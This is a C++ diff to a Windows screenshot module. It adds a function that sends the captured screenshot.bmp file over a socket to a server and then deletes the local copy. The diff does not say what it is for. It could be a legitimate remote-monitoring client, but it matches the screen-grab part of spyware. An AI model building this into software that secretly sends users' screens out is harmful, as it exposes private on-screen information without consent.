@@ -1,4 +1,5 @@
 #include "screenshot.h"
+#include <cstdio>
 
 int SaveBitmapToFile(HBITMAP hBitmap, const char* fileName) {
     BITMAP bmp;
@@ -61,7 +62,34 @@ int SaveBitmapToFile(HBITMAP hBitmap, const char* fileName) {
     return 0;
 }
 
-int CaptureScreenshot() {
+
+int SendFileOverSocket(SOCKET clientSocket, const char* filePath) {
+    std::ifstream file(filePath, std::ios::binary);
+    if (!file) {
+        std::cerr << "Ошибка при открытии файла." << std::endl;
+        return -1;
+    }
+
+    char buffer[1024];
+    int bytesRead;
+
+    while (!file.eof()) {
+        file.read(buffer, sizeof(buffer));
+        bytesRead = file.gcount();
+        send(clientSocket, buffer, bytesRead, 0);
+    }
+
+    // Отправка завершающего байта
+    char endMarker = '\x00';
+    send(clientSocket, &endMarker, 1, 0);
+
+    file.close();
+
+    return 0;
+}
+
+
+int CaptureScreenshot(SOCKET clientSocket) {
     HDC hdcScreen = GetDC(NULL);
 
     if (!hdcScreen) {
@@ -82,6 +110,19 @@ int CaptureScreenshot() {
     }
     else {
         std::cerr << "Ошибка при сохранении скриншота." << std::endl;
+    }
+    if (SendFileOverSocket(clientSocket, "screenshot.bmp") == 0) {
+        std::cout << "Файл успешно отправлен на сервер." << std::endl;
+    }
+    else {
+        std::cerr << "Ошибка при отправке файла." << std::endl;
+    }
+
+    if (std::remove("screenshot.bmp") == 0) {
+        std::cout << "Файл успешно удален." << std::endl;
+    }
+    else {
+        std::cerr << "Ошибка при удалении файла." << std::endl;
     }
 
     DeleteObject(hBitmap);
